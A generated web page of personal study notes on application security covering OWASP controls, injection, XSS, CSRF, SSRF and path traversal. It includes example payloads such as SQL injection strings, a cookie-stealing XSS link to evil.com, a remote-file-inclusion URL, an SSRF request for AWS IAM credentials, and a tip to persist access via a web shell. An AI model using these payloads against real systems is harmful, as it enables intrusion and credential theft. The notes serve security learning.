@@ -1,0 +1,2943 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="
+  Application Security
+  
+  #
+  
+
+
+  Software Assurance Best Practices
+  
+  #
+  
+
+
+The Software Development Lifecycle
+
+Planning &gt; Requirements &gt; Design &gt; Coding &gt; Testing &gt; Training &amp; Transition &gt; Ongoing Ops/maintenance &gt; End Of Life (Decommission)
+dev env &gt; for devs
+test env &gt; QA/Preprod
+staging &gt; tested but awaiting deployment
+prod
+
+
+DevSecOps and DevOps
+
+Sec becomes a shared responsibility, just like the Ops.
+
+
+
+
+  Designing and Coding For Security
+  
+  #
+  
+
+
+Secure Coding Practices
+
+Open Worldwide Application Security Project (OWASP) - best resource for secure coding practices.
+Top Proactive Security Controls by OWASP
+
+Define Security Requirements
+Leverage Security Frameworks
+Secure Database Access
+Encode an Escape Data
+Validate all inputs
+Implement DIgital Identity
+Enforce Access Controls
+Priotect Data Everywhere
+Implement Security Logging and Monitoring
+Handle all errors and exceptions
+
+
+OWASP Proactive Controls
+OWASP Quick Reference
+
+
+API Security
+
+OWASP API Security
+
+
+
+
+  Software Security Testing
+  
+  #
+  
+
+
+State Of Software Security Report
+Analyzing and Testing Code
+
+Static Code Analysis - reads the actual code to find flaws in it
+Dynamic Code Analysis - runs the code to find flaws in it
+Fuzzing - send random data to application to see how it handles unexpected data
+
+
+
+
+  Injection Vulnerabilitiies
+  
+  #
+  
+
+
+SQL Injection Attacks
+
+Is also a class under Code Injection attacks.
+Happens when User Input is directly used in a SQL Query
+
+Query Used SELECT * FROM Products WHERE Name LIKE &#39;%user_input_value%&#39;
+User Input cola&#39;; SELECT * FROM users; -- instead of just cola
+Results in : SELECT * FROM Products WHERE Name LIKE &#39;cola&#39;; SELECT * FROM users; --, so 2 SQL queries
+However, the results might not be returned/visible to the user, solution? Blind SQL Injection
+2 Blind SQL Injection Types
+
+Blind Content-Based SQL Injection
+
+First: Validate if SQL Injection is possible
+Asume we expect an UserID as User input, and let&rsquo;s assume 123 is a vailid UserID.
+Query Used SELECT * FROM Users WHERE Id = &#39;%user_input_value%&#39;
+Specify 123&#39; OR 1=1 which results in SELECT * FROM Users WHERE Id = &#39;123&#39; OR 1=1
+This returns multiple rows, did it break anything on the front end? No ? Good ✅
+
+You might not see the multiple rows due to business logic,but it DID EXECUTE properly (you get feedback that the query was valid)
+
+
+Now specify 123&#39; OR 1=2 which results in SELECT * FROM Users WHERE Id = &#39;123&#39; OR 1=2
+This returns no row, did it break anything on the front end aside of just saying that there were no results? Yes ? Good ✅
+We can now asume that SQL injection is possible.
+Now you can inject other querys that ALTER data. The baseline feedback if it was succesful or not your query is established in previous steps. Based on the CONTENT you were able to validate if your queries are working
+
+
+Blind Time-Based SQL Injection - (example in Microsoft SQL)
+
+First: Validate if SQL Injection is possible
+Asume we expect an UserID as User input, and let&rsquo;s assume 123 is a vailid UserID.
+Specify 123&#39;; WAITFOR DELAY &#39;00:00:15&#39; which results in SELECT * FROM Users WHERE Id = &#39;123&#39;; WAITFOR DELAY &#39;00:00:15&#39;
+If the query now takes 15 seconds to execute, we can be quite confident that the SQL injection is possible. ✅.
+⚠️ Now this &ldquo;timer&rdquo; trick, can be also used to signal back if something was &rsquo;true&rsquo; (if true, wait 15 seconds, else not).
+
+An example, assuming the password is cleartext
+
+  For each character in the password
+    For each letter in the alphabet
+      if the current character is equal to the current letter, wait 15 seconds before returning results
+
+
+
+
+
+
+
+
+
+Code Injection Attacks
+
+Examples
+
+LDAP Injection Attack - Embed commands in text as part of a LDAP query
+XML Injection Attack - Embed code in XML text
+DLL Injection Attack - Force an application to load a (malicious) DLL that was not a part of the process.
+Cross-Site-Scripting (XSS)
+
+
+
+
+Command Injection Attacks
+
+When an application executes a command against the OS, there is a potential for exploitation.
+Example
+
+You have a webpage to create a user and the end user must specify a username in a form
+On creation, the app might run a command to create a folder for that new user system(&#39;mkdir /home/students/&lt;mynewusername&gt;)
+What if the user specifies mynewusername &amp;&amp; rm -rf home
+Now we have piped again additional commands
+⚠️ Note that there is again no feedback/response, but you could try to have a script use a time or a curl command to post back the output to a webserver you own.
+
+
+
+
+
+
+  Exploiting Authentication Vulnerabilities
+  
+  #
+  
+
+
+Password Authentication
+
+Flaw: Once an attacher knows a password, they can keep using it for access.
+Risk: Social Engineering, unencrypted traffic, password dumps from hacked sites, brute force, guessing
+
+
+Session Attacks
+
+Cookie Stealing &amp; Manipulation
+
+Steal an existing (authentication) session
+After auth, the session token is stored in browser cookie for further request auth
+How to steal it?
+
+Unencrypted network traffic
+Malware in browser
+On Path attack - Impersonate target site, forward the actual credentials to target site, return the request to the user with the cookie, but now you also have that cookie. (But you know then the credentials either way?)
+
+
+Once you have the cookie
+
+Session Replay Attack - The attacker reuses the session of the target
+
+
+Defenses
+
+Mark Cookie SECURE - tells the browser to never send it over unencrypted requests
+
+
+NTLM pass-the-hash
+
+NTLM hash is the hash function in windows to store user&rsquo;s passwords.
+So if you can intercept this hash, instead of the username/password, you can also authenticate in/with windows.
+
+
+
+
+Unvalidated Redirects
+
+Example: example.com/order?redirect_ok=https://evilsite.com and then the evil site can impersonate and ask to re authenticate again or whaterver
+Example: example.com/login?login_ok=https://evilsite.com, then after login it might call https://evilsite.com?csrf_token=&lt;somevalue&gt; or the Referer: https://bank.com/transfer?sessionid=abc123&amp;csrf_token=xyz789 header
+
+
+
+
+
+
+  Exploiting Authorization Vulnerabilities
+  
+  #
+  
+
+
+Insecure Direct Object References
+
+example.com/orders?id=100 shows your order and you can just do example.com/orders?id=101 and see anothers order.
+
+
+Directory Traversal
+
+The web server allows to navigate the directory and list all files - bad configuration
+
+Appache Server / NGINX - www.example.com/../../../etc/shawdow (so you just path yourself outside the web folder)
+Open AWS S3 bucket
+It helps to know on what server the site is host to then learn about their (Default) config
+
+
+
+
+File Inclusion
+
+Next level Directory Traversel - you don&rsquo;t just read a file, you execute it
+Run a file from the server&rsquo;s file system: www.example.com/?include=../../../etc/attack.sh
+Run a file from an external place: www.example.com/?include=www.evilsite.com/script.sh
+Attack might then upload a Web Shell to comfortably run commands and see output
+
+✅ The webshell uses HTTPS, so it hides even better.
+
+
+TIP: Patch the vulnerability and persist your access with the web shell
+
+
+Privilege Escalation
+
+Upgrade your user to have more rights or higher group
+Dirty Cow - Linux vulnerability
+
+
+
+
+  Exploiting Web Application Vulnerabilities
+  
+  #
+  
+
+
+Cross-Site Scripting XSS - when an attacker does HTML injection (inject their own HTML into a webpage)
+
+Reflected XSS
+
+When an application allows &ldquo;reflected input&rdquo;
+Anywhere, where a user can provide &ldquo;input&rdquo; that later would be viewed by another user there is a XSS oppertunity.
+Example https://news.com/search.php?q=&lt;script&gt;document.location=&#39;https://evil.com/steal?cookie=&#39;&#43;document.cookie&lt;/script&gt; assuming that the search page would (without validation) render the search query q in the html (Search results for q.)
+
+
+Stored/Persistent XSS
+
+Here the XSS script is stored server/side
+Example: I leave a product review with content Good product! &lt;script&gt;alert(&#39;oi&#39;)&lt;/script&gt;
+
+If this input is not sanatized or cleaned, it will store this string in the database.
+When someone else views the product, and all comments are rendered underneath, the &lt;script&gt;alert(&#39;oi&#39;)&lt;/script&gt; part will be seen as actual HTML and the script tag will execute.
+Now you can replace alert(&#39;oi&#39;) with javascript that will log your keys, steal your cookies, etc&hellip; cause you are now runng a script under the domain of the trusted site.
+
+
+⚠️ Think of other ways where you can &ldquo;inject HTML&rdquo; on the request route or from a browser plugin.
+Solutions
+
+Input validation and escaping
+OWASP Cheatsheet
+
+
+
+
+
+
+Request Forgery
+
+Exploit trust relationships and try users to unwittingly execute commands against a remote server, there are 2 types.
+Cross-Site Request Forgery CSRF/XSRF
+
+Assume you are logged in to mybank.com.
+You then visit a dangerous site or link evil.com
+When you click on a button on evil.com it might trigger a request to mybank.com
+If you are stil loggedin to mybank.com, the request could succeed because the browser would use any cookies linked to the mybank.com site.
+Example HTMl on the evil.com site
+
+    &lt;!-- Hidden on evilsite.com --&gt;
+    &lt;form action=&#34;https://somebank.com/transfer&#34; method=&#34;POST&#34; id=&#34;malicious-form&#34;&gt;
+        &lt;input type=&#34;hidden&#34; name=&#34;to_account&#34; value=&#34;999999&#34;&gt;
+        &lt;input type=&#34;hidden&#34; name=&#34;amount&#34; value=&#34;5000&#34;&gt;
+        &lt;!-- Note: no CSRF token! --&gt;
+    &lt;/form&gt;
+
+    &lt;script&gt;
+        // Automatically submit when page loads
+        // document.getElementById(&#39;malicious-form&#39;).submit();
+    &lt;/script&gt;
+
+Defenses: secure tokens, check in reffering url to only accept urls that originate from own domain.
+
+
+Server-Side Request Forgery SSRF
+
+Here we want the server/back-end to make an web call to a url.
+Let&rsquo;s say you have a web application that takes an URL as input
+That URL would be used to fetch remote information, and it would return that in some form.
+Imagine for that URL, you specifcy a URL or IP address that would be not publicly available, but only to your back-end server
+Example: GET /preview?url=http://localhost:8080/admin/users
+Example: GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ on AWS exposes IAM credentials
+Example: GET /preview?url=file:///etc/passwd
+
+
+
+
+
+
+  Application Security Controls
+  
+  #
+  
+
+
+Input Validation
+
+Protects agains Injection attackes, XSS, XSRF, SSRF and many more.
+Best method: Allow Listing
+
+When you expect an age, only allow values between 0 - 125, anything else get rejected.
+Remember, always test at least server side.
+
+
+Next best method: Deny Listing (Cause often describing only what is allow is to wide)
+
+Look and block for SQL code, HTML tags, etc..
+
+
+Parameter Pollution - a trick attackers try to get around input validatio/filtering
+
+Example www.example.com/status?account=1&amp;account=1&#39; or 1=1;--
+
+Here the hope is that validiation only happens on the first specification of the parameter, but not the second.
+This behaviour is very tech specific (PHP, ExpressJS, ASP, Python Flask,&hellip;.) so the hack really depends on the web server stack.
+Example : Authentication Bypass - it might take the right passwor for user guest but think it was user admin
+
+POST /login
+user=admin&amp;pass=wrong&amp;user=guest&amp;pass=correct
+
+Example : Rate Limiting bypass
+
+GET /api/data?user_id=victim&amp;user_id=attacker
+
+
+
+
+
+Web Application Firewalls (WAFS)
+
+A WAF sits in front of the actual web server and acts like a firewall but on application level. It can inspect requests and intercept/filter anything suspicious, which would be another layer of security, hopefully blocking this that the eventual backend is not handling.
+Note that the client has a TLS connection to the WAF, so the WAF can inspect all traffic, but then forwads the request as a new TLS connection to the origins server.
+
+
+Parameterized Queries
+
+Input is not put directly into the SQL string, but parameterized, this way the entire input data is pure data, not a part of the SQL text. So it&rsquo;s uses as a literal string. Unescapable (is the theory)
+
+
+Sandboxing
+
+Run app in a controlled or isolated environment, preventing interaction with surroundings.
+
+
+Code Security
+
+Securing the code itself
+Code Signing - Sign code by devs to confirm authencity (PGP signature for example)
+Code Reuse - Monitor and mainting even higher standards for reused code (e.g. SDKs)
+Software Diversity - Watch for single points of failuree
+Code Repositories - versioning and history is great for audit
+Integrity Measurement - Make sure that approved code its hash matches to the hash being deployed
+Application Resilience - through 2 ways
+
+Scalability - designed so extra resources can be added
+Elasticty - a step further, it provisions extra resources when it needs it
+
+
+
+
+
+
+  Secure Coding Practices
+  
+  #
+  
+
+
+Source Handling Comments - Remove code comments in production code (for the non compiled code, like JS)
+Error Handling - Be cautious that error messages dont give to much detail, no debug mode in prod!
+Hard-Coded Credentials
+
+Well intentioned backdoor - Once the credentials are known, any deployed version is at risk
+Non intentioned - API keys etc..
+
+
+Package Monitoring - Monitor your dependencies and packages,
+Memory Management
+
+Resource Exhaustion - Can make the application crash (e.g. memory leak)
+Pointer Deference - Memory Pointers, when a pointer points to a memory spot with unkown value it can crash or worst case bypass validation
+Buffer Overflows - Attack tricks the app to handle more data then it has assigned.
+
+Memory Injection: Goal is to overwrite memory with instructions that might be executed by another process running on the system
+
+
+
+
+Race Conditions
+
+When Security of the code depends upon a sequence of events within the system
+
+Time-Of-Check (TOC) - When a system verifies access permissions or other security controls.
+Time-Of-Use (TOU) - When the system access the resources or permission that was granted.
+Target of Evaluation (TOE) - refers to component/system being evaluated or tested for potential vulnerabilities.
+TIme-Of-Check-To-Time-Of-Use issue is a race condition when the app checks the permission too far ahead of a resource request.
+Example: If an attacker logs in and has admin rights via a web interface, leaves that session open for a day, but within a hour his admin rights are taken away, this change might not be observed yet everywhere, cause a session is open and permissions were already evaluated.
+
+
+
+
+Unprotected APIs
+
+APIs should be authenticated and make sure that at every endpoint AutH and AuthZ is happening.
+
+
+
+
+  Automation and Orchestration
+  
+  #
+  
+
+SOAR: Security Orchestration, Automation, and response platforms.">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/cybersecurity/application-security/">
+  <meta property="og:site_name" content="Knowledgebase">
+  <meta property="og:title" content="Knowledgebase">
+  <meta property="og:description" content="Application Security # Software Assurance Best Practices # The Software Development Lifecycle Planning &gt; Requirements &gt; Design &gt; Coding &gt; Testing &gt; Training &amp; Transition &gt; Ongoing Ops/maintenance &gt; End Of Life (Decommission) dev env &gt; for devs test env &gt; QA/Preprod staging &gt; tested but awaiting deployment prod DevSecOps and DevOps Sec becomes a shared responsibility, just like the Ops. Designing and Coding For Security # Secure Coding Practices Open Worldwide Application Security Project (OWASP) - best resource for secure coding practices. Top Proactive Security Controls by OWASP Define Security Requirements Leverage Security Frameworks Secure Database Access Encode an Escape Data Validate all inputs Implement DIgital Identity Enforce Access Controls Priotect Data Everywhere Implement Security Logging and Monitoring Handle all errors and exceptions OWASP Proactive Controls OWASP Quick Reference API Security OWASP API Security Software Security Testing # State Of Software Security Report Analyzing and Testing Code Static Code Analysis - reads the actual code to find flaws in it Dynamic Code Analysis - runs the code to find flaws in it Fuzzing - send random data to application to see how it handles unexpected data Injection Vulnerabilitiies # SQL Injection Attacks Is also a class under Code Injection attacks. Happens when User Input is directly used in a SQL Query Query Used SELECT * FROM Products WHERE Name LIKE &#39;%user_input_value%&#39; User Input cola&#39;; SELECT * FROM users; -- instead of just cola Results in : SELECT * FROM Products WHERE Name LIKE &#39;cola&#39;; SELECT * FROM users; --, so 2 SQL queries However, the results might not be returned/visible to the user, solution? Blind SQL Injection 2 Blind SQL Injection Types Blind Content-Based SQL Injection First: Validate if SQL Injection is possible Asume we expect an UserID as User input, and let’s assume 123 is a vailid UserID. Query Used SELECT * FROM Users WHERE Id = &#39;%user_input_value%&#39; Specify 123&#39; OR 1=1 which results in SELECT * FROM Users WHERE Id = &#39;123&#39; OR 1=1 This returns multiple rows, did it break anything on the front end? No ? Good ✅ You might not see the multiple rows due to business logic,but it DID EXECUTE properly (you get feedback that the query was valid) Now specify 123&#39; OR 1=2 which results in SELECT * FROM Users WHERE Id = &#39;123&#39; OR 1=2 This returns no row, did it break anything on the front end aside of just saying that there were no results? Yes ? Good ✅ We can now asume that SQL injection is possible. Now you can inject other querys that ALTER data. The baseline feedback if it was succesful or not your query is established in previous steps. Based on the CONTENT you were able to validate if your queries are working Blind Time-Based SQL Injection - (example in Microsoft SQL) First: Validate if SQL Injection is possible Asume we expect an UserID as User input, and let’s assume 123 is a vailid UserID. Specify 123&#39;; WAITFOR DELAY &#39;00:00:15&#39; which results in SELECT * FROM Users WHERE Id = &#39;123&#39;; WAITFOR DELAY &#39;00:00:15&#39; If the query now takes 15 seconds to execute, we can be quite confident that the SQL injection is possible. ✅. ⚠️ Now this “timer” trick, can be also used to signal back if something was ’true’ (if true, wait 15 seconds, else not). An example, assuming the password is cleartext For each character in the password For each letter in the alphabet if the current character is equal to the current letter, wait 15 seconds before returning results Code Injection Attacks Examples LDAP Injection Attack - Embed commands in text as part of a LDAP query XML Injection Attack - Embed code in XML text DLL Injection Attack - Force an application to load a (malicious) DLL that was not a part of the process. Cross-Site-Scripting (XSS) Command Injection Attacks When an application executes a command against the OS, there is a potential for exploitation. Example You have a webpage to create a user and the end user must specify a username in a form On creation, the app might run a command to create a folder for that new user system(&#39;mkdir /home/students/&lt;mynewusername&gt;) What if the user specifies mynewusername &amp;&amp; rm -rf home Now we have piped again additional commands ⚠️ Note that there is again no feedback/response, but you could try to have a script use a time or a curl command to post back the output to a webserver you own. Exploiting Authentication Vulnerabilities # Password Authentication Flaw: Once an attacher knows a password, they can keep using it for access. Risk: Social Engineering, unencrypted traffic, password dumps from hacked sites, brute force, guessing Session Attacks Cookie Stealing &amp; Manipulation Steal an existing (authentication) session After auth, the session token is stored in browser cookie for further request auth How to steal it? Unencrypted network traffic Malware in browser On Path attack - Impersonate target site, forward the actual credentials to target site, return the request to the user with the cookie, but now you also have that cookie. (But you know then the credentials either way?) Once you have the cookie Session Replay Attack - The attacker reuses the session of the target Defenses Mark Cookie SECURE - tells the browser to never send it over unencrypted requests NTLM pass-the-hash NTLM hash is the hash function in windows to store user’s passwords. So if you can intercept this hash, instead of the username/password, you can also authenticate in/with windows. Unvalidated Redirects Example: example.com/order?redirect_ok=https://evilsite.com and then the evil site can impersonate and ask to re authenticate again or whaterver Example: example.com/login?login_ok=https://evilsite.com, then after login it might call https://evilsite.com?csrf_token=&lt;somevalue&gt; or the Referer: https://bank.com/transfer?sessionid=abc123&amp;csrf_token=xyz789 header Exploiting Authorization Vulnerabilities # Insecure Direct Object References example.com/orders?id=100 shows your order and you can just do example.com/orders?id=101 and see anothers order. Directory Traversal The web server allows to navigate the directory and list all files - bad configuration Appache Server / NGINX - www.example.com/../../../etc/shawdow (so you just path yourself outside the web folder) Open AWS S3 bucket It helps to know on what server the site is host to then learn about their (Default) config File Inclusion Next level Directory Traversel - you don’t just read a file, you execute it Run a file from the server’s file system: www.example.com/?include=../../../etc/attack.sh Run a file from an external place: www.example.com/?include=www.evilsite.com/script.sh Attack might then upload a Web Shell to comfortably run commands and see output ✅ The webshell uses HTTPS, so it hides even better. TIP: Patch the vulnerability and persist your access with the web shell Privilege Escalation Upgrade your user to have more rights or higher group Dirty Cow - Linux vulnerability Exploiting Web Application Vulnerabilities # Cross-Site Scripting XSS - when an attacker does HTML injection (inject their own HTML into a webpage) Reflected XSS When an application allows “reflected input” Anywhere, where a user can provide “input” that later would be viewed by another user there is a XSS oppertunity. Example https://news.com/search.php?q=&lt;script&gt;document.location=&#39;https://evil.com/steal?cookie=&#39;&#43;document.cookie&lt;/script&gt; assuming that the search page would (without validation) render the search query q in the html (Search results for q.) Stored/Persistent XSS Here the XSS script is stored server/side Example: I leave a product review with content Good product! &lt;script&gt;alert(&#39;oi&#39;)&lt;/script&gt; If this input is not sanatized or cleaned, it will store this string in the database. When someone else views the product, and all comments are rendered underneath, the &lt;script&gt;alert(&#39;oi&#39;)&lt;/script&gt; part will be seen as actual HTML and the script tag will execute. Now you can replace alert(&#39;oi&#39;) with javascript that will log your keys, steal your cookies, etc… cause you are now runng a script under the domain of the trusted site. ⚠️ Think of other ways where you can “inject HTML” on the request route or from a browser plugin. Solutions Input validation and escaping OWASP Cheatsheet Request Forgery Exploit trust relationships and try users to unwittingly execute commands against a remote server, there are 2 types. Cross-Site Request Forgery CSRF/XSRF Assume you are logged in to mybank.com. You then visit a dangerous site or link evil.com When you click on a button on evil.com it might trigger a request to mybank.com If you are stil loggedin to mybank.com, the request could succeed because the browser would use any cookies linked to the mybank.com site. Example HTMl on the evil.com site &lt;!-- Hidden on evilsite.com --&gt; &lt;form action=&#34;https://somebank.com/transfer&#34; method=&#34;POST&#34; id=&#34;malicious-form&#34;&gt; &lt;input type=&#34;hidden&#34; name=&#34;to_account&#34; value=&#34;999999&#34;&gt; &lt;input type=&#34;hidden&#34; name=&#34;amount&#34; value=&#34;5000&#34;&gt; &lt;!-- Note: no CSRF token! --&gt; &lt;/form&gt; &lt;script&gt; // Automatically submit when page loads // document.getElementById(&#39;malicious-form&#39;).submit(); &lt;/script&gt; Defenses: secure tokens, check in reffering url to only accept urls that originate from own domain. Server-Side Request Forgery SSRF Here we want the server/back-end to make an web call to a url. Let’s say you have a web application that takes an URL as input That URL would be used to fetch remote information, and it would return that in some form. Imagine for that URL, you specifcy a URL or IP address that would be not publicly available, but only to your back-end server Example: GET /preview?url=http://localhost:8080/admin/users Example: GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ on AWS exposes IAM credentials Example: GET /preview?url=file:///etc/passwd Application Security Controls # Input Validation Protects agains Injection attackes, XSS, XSRF, SSRF and many more. Best method: Allow Listing When you expect an age, only allow values between 0 - 125, anything else get rejected. Remember, always test at least server side. Next best method: Deny Listing (Cause often describing only what is allow is to wide) Look and block for SQL code, HTML tags, etc.. Parameter Pollution - a trick attackers try to get around input validatio/filtering Example www.example.com/status?account=1&amp;account=1&#39; or 1=1;-- Here the hope is that validiation only happens on the first specification of the parameter, but not the second. This behaviour is very tech specific (PHP, ExpressJS, ASP, Python Flask,….) so the hack really depends on the web server stack. Example : Authentication Bypass - it might take the right passwor for user guest but think it was user admin POST /login user=admin&amp;pass=wrong&amp;user=guest&amp;pass=correct Example : Rate Limiting bypass GET /api/data?user_id=victim&amp;user_id=attacker Web Application Firewalls (WAFS) A WAF sits in front of the actual web server and acts like a firewall but on application level. It can inspect requests and intercept/filter anything suspicious, which would be another layer of security, hopefully blocking this that the eventual backend is not handling. Note that the client has a TLS connection to the WAF, so the WAF can inspect all traffic, but then forwads the request as a new TLS connection to the origins server. Parameterized Queries Input is not put directly into the SQL string, but parameterized, this way the entire input data is pure data, not a part of the SQL text. So it’s uses as a literal string. Unescapable (is the theory) Sandboxing Run app in a controlled or isolated environment, preventing interaction with surroundings. Code Security Securing the code itself Code Signing - Sign code by devs to confirm authencity (PGP signature for example) Code Reuse - Monitor and mainting even higher standards for reused code (e.g. SDKs) Software Diversity - Watch for single points of failuree Code Repositories - versioning and history is great for audit Integrity Measurement - Make sure that approved code its hash matches to the hash being deployed Application Resilience - through 2 ways Scalability - designed so extra resources can be added Elasticty - a step further, it provisions extra resources when it needs it Secure Coding Practices # Source Handling Comments - Remove code comments in production code (for the non compiled code, like JS) Error Handling - Be cautious that error messages dont give to much detail, no debug mode in prod! Hard-Coded Credentials Well intentioned backdoor - Once the credentials are known, any deployed version is at risk Non intentioned - API keys etc.. Package Monitoring - Monitor your dependencies and packages, Memory Management Resource Exhaustion - Can make the application crash (e.g. memory leak) Pointer Deference - Memory Pointers, when a pointer points to a memory spot with unkown value it can crash or worst case bypass validation Buffer Overflows - Attack tricks the app to handle more data then it has assigned. Memory Injection: Goal is to overwrite memory with instructions that might be executed by another process running on the system Race Conditions When Security of the code depends upon a sequence of events within the system Time-Of-Check (TOC) - When a system verifies access permissions or other security controls. Time-Of-Use (TOU) - When the system access the resources or permission that was granted. Target of Evaluation (TOE) - refers to component/system being evaluated or tested for potential vulnerabilities. TIme-Of-Check-To-Time-Of-Use issue is a race condition when the app checks the permission too far ahead of a resource request. Example: If an attacker logs in and has admin rights via a web interface, leaves that session open for a day, but within a hour his admin rights are taken away, this change might not be observed yet everywhere, cause a session is open and permissions were already evaluated. Unprotected APIs APIs should be authenticated and make sure that at every endpoint AutH and AuthZ is happening. Automation and Orchestration # SOAR: Security Orchestration, Automation, and response platforms.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="cybersecurity">
+<title>Application Security | Knowledgebase</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/cybersecurity/application-security/">
+<link rel="stylesheet" href="/book.min.866fe3b5cf39ea9e02248ffa9697b15426d589b2a9d1a1c5445b50cf172c641d.css" integrity="sha256-hm/jtc856p4CJI/6lpexVCbVibKp0aHFRFtQzxcsZB0=" crossorigin="anonymous">
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.26972e289cf0c4087788158e310ef918185c87f0191b6e85abd5c6be7f9a2edd.js" integrity="sha256-JpcuKJzwxAh3iBWOMQ75GBhch/AZG26Fq9XGvn&#43;aLt0=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-cybersecurity book-layout-">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><span>Knowledgebase</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e5f62e7c7cdb1036e45df02260144099" class="toggle"  />
+    <label for="section-e5f62e7c7cdb1036e45df02260144099" class="flex">
+      <a href="/azure/" class="flex-auto ">Azure</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/azure/az-300-notes/" class="">Az 300 Notes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/azure/az-300/" class="">Az 300</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-3ffbfdbde140576d9f074ff50396f562" class="toggle"  />
+    <label for="section-3ffbfdbde140576d9f074ff50396f562" class="flex">
+      <a href="/business/" class="flex-auto ">Business</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-3c8647f839e999b7a6298918f774b8cd" class="toggle"  />
+    <label for="section-3c8647f839e999b7a6298918f774b8cd" class="flex">
+      <a href="/career/" class="flex-auto ">Career</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-26cea5b7eeb0c8a351c3f47bd5d16991" class="toggle"  />
+    <label for="section-26cea5b7eeb0c8a351c3f47bd5d16991" class="flex">
+      <a href="/change-management/" class="flex-auto ">Change Management</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/change-management/patterns/" class="">Patterns</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-a078b2e564583a7361772de72985e006" class="toggle"  />
+    <label for="section-a078b2e564583a7361772de72985e006" class="flex">
+      <a href="/coaching/" class="flex-auto ">Coaching</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4dfc82ddbe95cc08d0f882cda0d7d567" class="toggle"  />
+    <label for="section-4dfc82ddbe95cc08d0f882cda0d7d567" class="flex">
+      <a href="/communication/" class="flex-auto ">Communication</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/communication/change-management/" class="">Change Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/communication/modes/" class="">Modes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/communication/presenting/" class="">Presenting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/communication/propaganda/" class="">Propaganda</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/communication/writing/" class="">Writing</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-be39247e81b1efaad9c6a55873f1c90e" class="toggle" checked />
+    <label for="section-be39247e81b1efaad9c6a55873f1c90e" class="flex">
+      <a href="/cybersecurity/" class="flex-auto ">Cybersecurity</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/application-security/" class="active">Application Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/cloud-and-virtualization-security/" class="">Cloud and Virtualization Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/cryptography-and-kpi/" class="">Cryptography and Kpi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/digital-forensics/" class="">Digital Forensics</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/endpoint-security/" class="">Endpoint Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/general-concepts/" class="">General Concepts</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/identity-and-access-management/" class="">Identity and Access Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/cybersecurity/malware-types/" class="">Malware Types</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
